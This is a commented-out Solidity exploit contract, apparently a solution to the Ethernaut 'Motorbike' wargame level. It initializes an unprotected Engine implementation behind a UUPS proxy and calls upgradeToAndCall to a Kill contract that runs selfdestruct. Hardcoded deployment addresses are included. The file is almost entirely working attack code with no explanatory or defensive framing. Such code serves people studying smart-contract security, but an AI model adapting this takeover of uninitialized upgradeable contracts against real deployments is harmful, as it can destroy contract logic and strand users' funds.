// //SPDX-License-Identifier: MIT

// pragma solidity <0.7.0;

// import "@openzeppelin/contracts@3.4.1/proxy/Initializable.sol";
// import "@openzeppelin/contracts@3.4.1/utils/Address.sol";
// import "./Motor.sol";

// contract  Kill{
//     function kill() public{
//         selfdestruct(address(0));
//     }
// }

// contract EXP {
//     Motorbike  motor;
//     Engine engine;
//     address engine_addr;
//     address kill;
//     address logic;
//     struct AddressSlot {
//         address value;
//     }

//     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

//     constructor() public {
//         logic = address(0x4b12bcD0aA1D1661059Ee5A7A633C74A0f2CF463);
//         engine_addr = address(uint160(0x000000000000000000000000a8152c262c4b8d44e38e55214c8eb7a75141bc53));
//         kill = address(0x55C02e71285075D90f748C9BE4b437B07d739AD7);
//         motor = Motorbike(payable(logic));
//     }

//     function attack() public {
//         engine = Engine(engine_addr);
//         engine.initialize();
//         bytes memory data = abi.encodeWithSignature("kill()");
//         engine.upgradeToAndCall(kill, data);
//     }

// }